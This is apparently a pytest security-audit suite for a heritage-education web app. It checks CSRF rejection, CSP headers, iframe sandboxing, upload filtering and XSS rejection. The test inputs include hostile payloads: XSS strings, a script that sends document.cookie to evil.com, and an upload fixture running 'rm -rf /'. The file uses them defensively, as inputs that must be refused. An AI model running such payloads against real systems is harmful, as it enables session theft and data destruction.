# -*- coding: utf-8 -*-
"""V5-T083: Comprehensive Security Audit Test Suite.

Wave W08, Slot A03 (Priority: P0, Classification: PRODUCTION_COMPLETION).
Verifies:
1. CSRF defense on state-mutating cookie-authenticated endpoints (POST/PATCH/DELETE).
2. Content-Security-Policy (CSP) headers: frame-ancestors, script-src, object-src 'none'.
3. Iframe sandboxing on external embeds (Sketchfab embeds and VR360 tours).
4. File upload sanitization: magic byte verification, executable/script extension rejection, max size enforcement.
5. Output encoding & HTML/XSS prevention on user-generated inputs (names, feedback, inquiry notes).
6. Negative abuse test: Forged cross-site cookie mutation is denied with 403; malicious script payloads are sanitized or rejected.
"""
from __future__ import annotations

import io
from datetime import date, timedelta
from pathlib import Path
from uuid import uuid4

import pytest
from starlette.testclient import TestClient

from backend.config import settings
from backend.errors import AppError
from backend.imperial_models import (
    CONTENT_SCOPE_IMPERIAL,
    ImperialMapAsset,
    ImperialSite,
    ImperialZone,
)
from backend.models import User, UserRole
from backend.models_rbpc import (
    RbpcConsentStatus,
    RbpcCreator,
    RbpcExperience,
    RbpcInquiry,
)
from backend.security import hash_password
from backend.services.media_cms import validate_file_content

REPO_ROOT = Path(__file__).resolve().parents[2]


# --------------------------------------------------------------------------- #
# Helpers & Fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture(autouse=True)
def _reset_auth_rate_limit():
    """Reset auth rate limit state before and after each test."""
    import backend.main as main

    if hasattr(main, "_auth_rate_limit_state"):
        main._auth_rate_limit_state.clear()
    yield
    if hasattr(main, "_auth_rate_limit_state"):
        main._auth_rate_limit_state.clear()


def _create_user(
    db_session,
    email: str,
    role: UserRole = UserRole.learner,
    display_name: str | None = None,
) -> User:
    """Create test user directly in DB."""
    user = User(
        email=email,
        password_hash=hash_password("Password123!"),
        display_name=display_name or f"User {email.split('@')[0]}",
        username=f"u_{uuid4().hex[:8]}",
        role=role,
        is_profile_public=True,
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    return user


def _login(client: TestClient, email: str, password: str = "Password123!") -> str:
    """Log in user and return access token value."""
    client.cookies.clear()
    res = client.post(
        "/api/v1/auth/login",
        json={"email": email, "password": password},
    )
    assert res.status_code == 200, f"Login failed for {email}: {res.text}"
    token = client.cookies.get(settings.access_cookie_name) or res.cookies.get(settings.access_cookie_name) or ""
    return token


def _setup_partner_and_inquiry(db_session) -> tuple[User, RbpcInquiry]:
    """Create test partner and a linked inquiry in initial 'new' state."""
    provider = _create_user(db_session, f"partner_{uuid4().hex[:6]}@example.com", role=UserRole.teacher)
    creator = RbpcCreator(
        slug=f"artisan-{uuid4().hex[:6]}",
        public_name="Nghệ nhân Đúc Đồng Huế",
        craft_tradition="Đúc đồng Phường Đúc",
        approved_bio_vi="Nghệ nhân gia truyền.",
        consent_status=RbpcConsentStatus.consented.value,
        is_verified=True,
    )
    db_session.add(creator)
    db_session.flush()

    exp = RbpcExperience(
        slug=f"exp-audit-{uuid4().hex[:6]}",
        title_vi="Trải nghiệm Đúc Đồng Cửu Đỉnh",
        title_en="Nine Dynastic Urns Bronze Experience",
        description_vi="Khảo sát kỹ nghệ đúc đồng truyền thống.",
        creator_id=creator.id,
        provider_name="Xưởng Đúc Đồng Cố Đô",
        provider_id=provider.id,
        publication_state="published",
        availability_mode="inquiry_only",
    )
    db_session.add(exp)
    db_session.flush()

    inquiry = RbpcInquiry(
        public_ref=f"INQ-{uuid4().hex[:4].upper()}-{uuid4().hex[:4].upper()}",
        experience_id=exp.id,
        provider_id=provider.id,
        name="Nguyễn Văn An",
        contact_channel="email",
        contact_value="an.nguyen@example.com",
        desired_date=date.today() + timedelta(days=5),
        party_size=2,
        message="Đăng ký trải nghiệm lịch sử",
        state="new",
        privacy_accepted=True,
        consent_version="rbpc-inquiry-v1",
        idempotency_key=str(uuid4()),
        opaque_token=f"tok_sec_{uuid4().hex}",
    )
    db_session.add(inquiry)
    db_session.commit()
    db_session.refresh(inquiry)
    return provider, inquiry


def _seed_map_and_site(db_session, creator: User) -> tuple[ImperialMapAsset, ImperialSite]:
    """Seed test zone, site, and map asset for annotation mutation tests."""
    zone = ImperialZone(
        id=uuid4(),
        content_scope=CONTENT_SCOPE_IMPERIAL,
        slug=f"zone-{uuid4().hex[:6]}",
        title_vi="Khu vực kiểm thử",
        title_en="Test Zone",
        description="Vùng không gian kiểm thử",
        display_order=1,
    )
    db_session.add(zone)
    db_session.flush()

    site = ImperialSite(
        id=uuid4(),
        content_scope=CONTENT_SCOPE_IMPERIAL,
        zone_id=zone.id,
        slug=f"site-{uuid4().hex[:6]}",
        name_vi="Điện Kiến Trung",
        name_en="Kien Trung Palace",
        site_type="palace",
        condition="extant",
        learning_level="L2_LEARNING_READY",
        is_published=True,
        display_order=1,
        created_by=creator.id,
        updated_by=creator.id,
    )
    db_session.add(site)
    db_session.flush()

    map_asset = ImperialMapAsset(
        id=uuid4(),
        content_scope=CONTENT_SCOPE_IMPERIAL,
        slug=f"map-{uuid4().hex[:6]}",
        version=1,
        title_vi="Bản đồ không ảnh kiểm thử",
        title_en="Test Aerial Map",
        width_px=4096,
        height_px=3072,
        mime_type="image/webp",
        image_storage_key="imperial/maps/test-map.webp",
        image_sha256="4b6c31046889c25651c6b1a7d6565fcf46200676b50e4a7a8d003f56d98f79d2",
        source_title="Tư liệu không ảnh",
        credit_text="Viện Di sản",
        license_kind="educational_fair_use",
        license_status="approved",
        review_status="draft",
        is_active=False,
        created_by=creator.id,
        row_version=1,
    )
    db_session.add(map_asset)
    db_session.commit()
    db_session.refresh(map_asset)
    db_session.refresh(site)
    return map_asset, site


def _make_png_bytes() -> bytes:
    """Generate minimal valid PNG bytes."""
    try:
        from PIL import Image

        buf = io.BytesIO()
        Image.new("RGB", (2, 2), (200, 30, 30)).save(buf, format="PNG")
        return buf.getvalue()
    except Exception:
        return b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


# --------------------------------------------------------------------------- #
# 1. CSRF Defense Tests (Requirement 1 & Requirement 6)
# --------------------------------------------------------------------------- #
def test_csrf_cookie_mutation_rejection_without_headers(client: TestClient, db_session):
    """Mutating cookie requests without anti-CSRF headers or with cross-site origins fail with 403."""
    admin = _create_user(db_session, f"admin_csrf_{uuid4().hex[:6]}@example.com", role=UserRole.admin)
    map_asset, site = _seed_map_and_site(db_session, admin)
    token = _login(client, admin.email)
    payload = {"site_id": str(site.id), "u": 0.44, "v": 0.55}

    # 1. Cookie mutation without custom anti-CSRF header -> 403 Forbidden
    res_no_header = client.post(
        f"/api/v1/imperial/admin/maps/{map_asset.id}/annotations",
        json=payload,
    )
    assert res_no_header.status_code == 403
    assert "CSRF validation failed" in res_no_header.text
    assert "missing custom anti-CSRF header on cookie mutation" in res_no_header.text

    # 2. Cookie mutation with Sec-Fetch-Site: cross-site -> 403 Forbidden
    res_cross_site = client.post(
        f"/api/v1/imperial/admin/maps/{map_asset.id}/annotations",
        json=payload,
        headers={"Sec-Fetch-Site": "cross-site", "X-Requested-With": "XMLHttpRequest"},
    )
    assert res_cross_site.status_code == 403
    assert "cross-site cookie mutation rejected" in res_cross_site.text

    # 3. Cookie mutation with forged cross-origin Origin header -> 403 Forbidden
    res_forged_origin = client.post(
        f"/api/v1/imperial/admin/maps/{map_asset.id}/annotations",
        json=payload,
        headers={"Origin": "https://evil-attacker.example.com", "X-Requested-With": "XMLHttpRequest"},
    )
    assert res_forged_origin.status_code == 403
    assert "cross-origin mutation rejected" in res_forged_origin.text

    # 4. Cookie mutation WITH custom anti-CSRF header (X-Requested-With) -> 201 Created
    res_valid_csrf = client.post(
        f"/api/v1/imperial/admin/maps/{map_asset.id}/annotations",
        json=payload,
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_valid_csrf.status_code == 201
    anno_id = res_valid_csrf.json()["id"]

    # 5. Direct Bearer token request (cookies purged) -> Succeeds without X-Requested-With header
    client.cookies.clear()
    res_bearer = client.patch(
        f"/api/v1/imperial/admin/annotations/{anno_id}",
        json={"u": 0.46, "v": 0.56, "row_version": 1},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert res_bearer.status_code == 200


def test_negative_abuse_forged_cross_site_partner_status_mutation_denied(client: TestClient, db_session):
    """Negative Abuse Test: Forged cross-site partner status mutation is denied with 403."""
    provider, inquiry = _setup_partner_and_inquiry(db_session)
    _login(client, provider.email)

    patch_payload = {
        "status": "contacted",
        "note": "Xác nhận lịch trải nghiệm qua điện thoại.",
    }

    # 1. Cross-site forged attack with Sec-Fetch-Site: cross-site -> Must be denied with 403
    res_forged_cross_site = client.patch(
        f"/api/v1/rbpc/partner/inquiries/{inquiry.id}",
        json=patch_payload,
        headers={"Sec-Fetch-Site": "cross-site"},
    )
    assert res_forged_cross_site.status_code == 403
    assert "cross-site cookie mutation rejected" in res_forged_cross_site.text

    # 2. Cross-origin forged attack with untrusted Origin -> Must be denied with 403
    res_forged_origin = client.patch(
        f"/api/v1/rbpc/partner/inquiries/{inquiry.id}",
        json=patch_payload,
        headers={"Origin": "https://malicious-phishing-site.org"},
    )
    assert res_forged_origin.status_code == 403
    assert "cross-origin mutation rejected" in res_forged_origin.text

    # 3. Legitimate partner request with X-Requested-With -> Succeeds with 200
    res_legit = client.patch(
        f"/api/v1/rbpc/partner/inquiries/{inquiry.id}",
        json=patch_payload,
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_legit.status_code == 200
    data = res_legit.json()
    assert data["status"] == "contacted"


# --------------------------------------------------------------------------- #
# 2. XSS & HTML Neutralization Tests (Requirement 5 & Requirement 6)
# --------------------------------------------------------------------------- #
def test_xss_payload_neutralization_registration_display_name(client: TestClient):
    """Registration with script or HTML tags in display_name is strictly rejected."""
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('pwned')>",
        "javascript:alert(1)",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<b>Bold</b> User",
    ]

    for payload in xss_payloads:
        res = client.post(
            "/api/v1/auth/register",
            json={
                "email": f"xss_{uuid4().hex[:6]}@example.com",
                "password": "Password123!",
                "display_name": payload,
            },
        )
        assert res.status_code == 400, f"Expected 400 for payload {payload}, got {res.status_code}"
        assert res.json()["error"]["code"] == "INVALID_DISPLAY_NAME"

    # Legitimate display names with Vietnamese accents and punctuation succeed
    res_legit = client.post(
        "/api/v1/auth/register",
        json={
            "email": f"legit_{uuid4().hex[:6]}@example.com",
            "password": "Password123!",
            "display_name": "Nguyễn Văn An (Học sinh Sử)",
        },
    )
    assert res_legit.status_code == 201


def test_xss_payload_neutralization_profile_update(client: TestClient, db_session):
    """User profile updates with XSS script injection in display_name are rejected."""
    user = _create_user(db_session, f"profile_xss_{uuid4().hex[:6]}@example.com")
    _login(client, user.email)

    res = client.patch(
        "/api/v1/users/me",
        json={"display_name": "<script>document.cookie='stolen'</script>"},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res.status_code == 400
    assert res.json()["error"]["code"] == "INVALID_DISPLAY_NAME"


def test_xss_payload_neutralization_inquiries_and_partner_notes(client: TestClient, db_session):
    """Inquiry creation and partner notes strictly neutralize and reject active script tags."""
    provider, inquiry = _setup_partner_and_inquiry(db_session)

    # 1. Public inquiry submission with active script pattern -> 422 RBPC_SPAM_DETECTED
    res_inq = client.post(
        "/api/v1/rbpc/inquiries",
        json={
            "experience_slug": inquiry.experience.slug,
            "contact": {
                "name": "Khách Tham Quan",
                "method": "email",
                "value": "visitor@example.com",
            },
            "preferred_date": (date.today() + timedelta(days=7)).isoformat(),
            "party_size": 2,
            "message": "Tôi muốn tham quan xưởng đúc <script>fetch('https://evil.com?c='+document.cookie)</script>",
            "consent": {
                "accepted": True,
                "privacy_accepted": True,
                "version": "rbpc-inquiry-v1",
            },
            "idempotency_key": str(uuid4()),
        },
    )
    assert res_inq.status_code == 422
    assert res_inq.json()["error"]["code"] == "RBPC_SPAM_DETECTED"

    # 2. Partner status update with active script pattern in internal note -> 422 MALICIOUS_INPUT_DETECTED
    _login(client, provider.email)
    res_note = client.patch(
        f"/api/v1/rbpc/partner/inquiries/{inquiry.id}",
        json={
            "status": "contacted",
            "note": "Xác nhận lịch <script>alert('pwn')</script>",
        },
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_note.status_code == 422
    assert res_note.json()["error"]["code"] == "MALICIOUS_INPUT_DETECTED"


# --------------------------------------------------------------------------- #
# 3. File Upload Sanitization Tests (Requirement 4 & Requirement 6)
# --------------------------------------------------------------------------- #
def test_malicious_upload_rejection_avatar(client: TestClient, db_session, monkeypatch, tmp_path):
    """Avatar upload rejects executable/script extensions, malicious magic bytes, and scripts."""
    import backend.routers.users as users_module

    monkeypatch.setattr(users_module, "AVATAR_DIR", tmp_path / "avatars")
    user = _create_user(db_session, f"upload_test_{uuid4().hex[:6]}@example.com")
    _login(client, user.email)

    # 1. Prohibited executable/script file extensions
    prohibited_files = [
        ("malicious.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/x-msdownload"),
        ("shell.php", b"<?php phpinfo(); ?>", "application/x-php"),
        ("exploit.html", b"<html><script>alert(1)</script></html>", "text/html"),
        ("attack.sh", b"#!/bin/bash\nrm -rf /", "application/x-sh"),
        ("payload.js", b"alert(document.cookie);", "application/javascript"),
    ]

    for fname, content, ctype in prohibited_files:
        res = client.post(
            "/api/v1/users/me/avatar",
            files={"file": (fname, content, ctype)},
            headers={"X-Requested-With": "XMLHttpRequest"},
        )
        assert res.status_code == 400, f"Expected 400 for {fname}, got {res.status_code}"
        assert res.json()["error"]["code"] in (
            "FORBIDDEN_FILE_TYPE",
            "MALICIOUS_CONTENT_DETECTED",
            "INVALID_IMAGE_CONTENT",
        )

    # 2. Executable binary signature in spoofed PNG
    res_bin_sig = client.post(
        "/api/v1/users/me/avatar",
        files={"file": ("fake.png", b"MZ\x00\x00" + b"\x00" * 30, "image/png")},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_bin_sig.status_code == 400
    assert res_bin_sig.json()["error"]["code"] == "MALICIOUS_CONTENT_DETECTED"

    # 3. Embedded script inside spoofed PNG
    res_script_embed = client.post(
        "/api/v1/users/me/avatar",
        files={"file": ("fake_script.png", b"\x89PNG\r\n\x1a\n<script>alert(1)</script>", "image/png")},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_script_embed.status_code == 400
    assert res_script_embed.json()["error"]["code"] == "MALICIOUS_CONTENT_DETECTED"

    # 4. File exceeding max size limit
    res_too_large = client.post(
        "/api/v1/users/me/avatar",
        files={"file": ("huge.png", b"\x89PNG\r\n\x1a\n" + b"x" * (users_module.MAX_AVATAR_SIZE + 10), "image/png")},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_too_large.status_code == 400
    assert res_too_large.json()["error"]["code"] == "AVATAR_TOO_LARGE"

    # 5. Valid PNG image succeeds
    res_valid = client.post(
        "/api/v1/users/me/avatar",
        files={"file": ("valid_avatar.png", _make_png_bytes(), "image/png")},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    assert res_valid.status_code == 200
    assert res_valid.json()["avatar_url"].startswith("/uploads/avatars/")


def test_malicious_upload_rejection_media_cms():
    """Media CMS service upload scanner validates magic bytes, size limits, and forbidden formats."""
    # 1. Prohibited extension
    with pytest.raises(AppError) as exc_exe:
        validate_file_content(b"MZ\x90\x00somebinary", "trojan.exe", "application/octet-stream")
    assert exc_exe.value.code == "FORBIDDEN_FILE_TYPE"

    # 2. Script in extension
    with pytest.raises(AppError) as exc_php:
        validate_file_content(b"<?php echo 'hello'; ?>", "backdoor.php", "text/php")
    assert exc_php.value.code == "FORBIDDEN_FILE_TYPE"

    # 3. Embedded HTML in .png extension
    with pytest.raises(AppError) as exc_html:
        validate_file_content(b"<html><script>alert(1)</script></html>", "polyglot.png", "image/png")
    assert exc_html.value.code == "MALICIOUS_CONTENT_DETECTED"

    # 4. Invalid GLB magic bytes
    with pytest.raises(AppError) as exc_glb:
        validate_file_content(b"NOT_GLTF_DATA_HERE_12345678", "model.glb", "model/gltf-binary")
    assert exc_glb.value.code == "INVALID_GLB_FORMAT"

    # 5. Valid GLB binary format
    glb_valid_header = b"glTF\x02\x00\x00\x00\x50\x00\x00\x00" + b"\x00" * 64
    fmt, mime, sha, size = validate_file_content(glb_valid_header, "dragon_urn.glb", "model/gltf-binary")
    assert fmt == "glb"
    assert mime == "model/gltf-binary"
    assert len(sha) == 64
    assert size == len(glb_valid_header)


# --------------------------------------------------------------------------- #
# 4. Content-Security-Policy (CSP) Verification (Requirement 2)
# --------------------------------------------------------------------------- #
def test_csp_security_headers_fastapi(client: TestClient):
    """FastAPI API responses uniformly carry Content-Security-Policy, HSTS, and XCTO."""
    endpoints = ["/health", "/api/v1/auth/me", "/this-route-does-not-exist"]

    for path in endpoints:
        res = client.get(path)
        csp = res.headers.get("content-security-policy")
        assert csp is not None, f"Missing Content-Security-Policy on {path}"
        assert "default-src 'self'" in csp
        assert "frame-ancestors 'none'" in csp
        assert "script-src 'self'" in csp
        assert "object-src 'none'" in csp

        # Standard additional transport security headers
        assert res.headers.get("x-content-type-options") == "nosniff"
        hsts = res.headers.get("strict-transport-security")
        assert hsts is not None and "max-age=" in hsts


def test_csp_security_headers_nginx_configs():
    """Verify that all production and staging Nginx configuration files enforce CSP rules."""
    nginx_files = [
        REPO_ROOT / "nginx-lms.conf",
        REPO_ROOT / "nginx-lms-histolab.conf",
        REPO_ROOT / "nginx-luunien-staging.conf",
        REPO_ROOT / "nginx.conf",
    ]

    for conf_file in nginx_files:
        assert conf_file.exists(), f"Nginx config not found: {conf_file}"
        content = conf_file.read_text(encoding="utf-8")
        assert "Content-Security-Policy" in content, f"Missing Content-Security-Policy in {conf_file.name}"
        assert "frame-ancestors" in content, f"Missing frame-ancestors in {conf_file.name}"
        assert "script-src" in content, f"Missing script-src in {conf_file.name}"
        assert "object-src 'none'" in content, f"Missing object-src 'none' in {conf_file.name}"


# --------------------------------------------------------------------------- #
# 5. Iframe Sandboxing Verification (Requirement 3)
# --------------------------------------------------------------------------- #
def test_iframe_sandboxing_frontend_components():
    """Verify external iframe embeds (Sketchfab & VR360) have strict sandbox attributes."""
    sketchfab_file = REPO_ROOT / "frontend/src/components/media/SketchfabExhibit.tsx"
    vr360_file = REPO_ROOT / "frontend/src/components/vr360/VirtualTours.tsx"

    assert sketchfab_file.exists(), "SketchfabExhibit component not found"
    sketchfab_code = sketchfab_file.read_text(encoding="utf-8")
    assert "<iframe" in sketchfab_code
    assert 'sandbox="allow-scripts allow-same-origin allow-popups"' in sketchfab_code
    assert 'referrerPolicy="origin"' in sketchfab_code

    assert vr360_file.exists(), "VirtualTours component not found"
    vr360_code = vr360_file.read_text(encoding="utf-8")
    assert "<iframe" in vr360_code
    assert 'sandbox="allow-scripts allow-same-origin allow-popups"' in vr360_code
